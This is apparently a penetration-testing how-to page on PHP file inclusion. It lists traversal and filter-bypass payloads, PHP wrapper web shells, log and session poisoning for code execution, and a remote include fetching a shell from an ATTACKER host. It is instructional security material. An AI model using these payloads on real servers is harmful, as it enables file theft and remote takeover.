---
title: Exploit file inclusion (LFI/RFI)
slug: file-inclusion
area: web
module: 20
order: 5
goal: Read sensitive files through a vulnerable include, and escalate to code execution where possible.
summary: How to exploit LFI/RFI — read files with traversal, use PHP wrappers to grab source and run code, poison logs or sessions for RCE, and pull in a remote shell when RFI is allowed.
prereqs: [A parameter that loads a file/page (?page=, ?file=, ?lang=), Knowing the server language, A listener if you reach RCE]
seeAlso: [tool:web-attacks, tool:web-proxies, tool:reverse-shells, howto:file-upload-to-shell, howto:command-injection]
references:
  - PayloadsAllTheThings: file inclusion | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
  - HackTricks: file inclusion / LFI | https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
---

A page that includes a file chosen by user input lets you load files the developer never meant to. Start by reading files; then escalate to running code.

## Read files with traversal

```text
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00          # null byte (older PHP)
?page=....//....//etc/passwd             # bypass naive ../ stripping
```

## PHP wrappers (read source, run code)

```text
?page=php://filter/convert.base64-encode/resource=config.php   # dump source as base64
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # <?php system($_GET[c]);
?page=php://input   (POST body: <?php system($_GET['c']); ?>)
?page=expect://id
```

## LFI to RCE by poisoning

Write PHP into a file you can then include:

```text
Log poisoning:  set User-Agent to <?php system($_GET['c']); ?>, then
?page=/var/log/apache2/access.log&c=id
Session:        write PHP into a $_SESSION value, then include /var/lib/php/sessions/sess_<id>
```

## Remote file inclusion (RFI)

Only if `allow_url_include` is on — host a shell and include it:

```text
?page=http://ATTACKER/shell.txt&c=id
```

## If it fails

- **File not found / path fixed**: the app appends an extension — try the null byte (old PHP), a wrapper, or `?page=file.php` without `.php`.
- **`../` stripped once**: use `....//` or nested encodings (`%252e%252e%252f`).
- **Can read but not execute**: no writable log/session you can include, and RFI is off — settle for reading creds/config and reuse them.
- **data:// blocked**: `allow_url_include` is off; pivot to log/session poisoning instead.

## Verify

`/etc/passwd` contents, readable source code, or command output via a wrapper/poisoned log all confirm it. Turn RCE into a reverse shell and move to privesc.
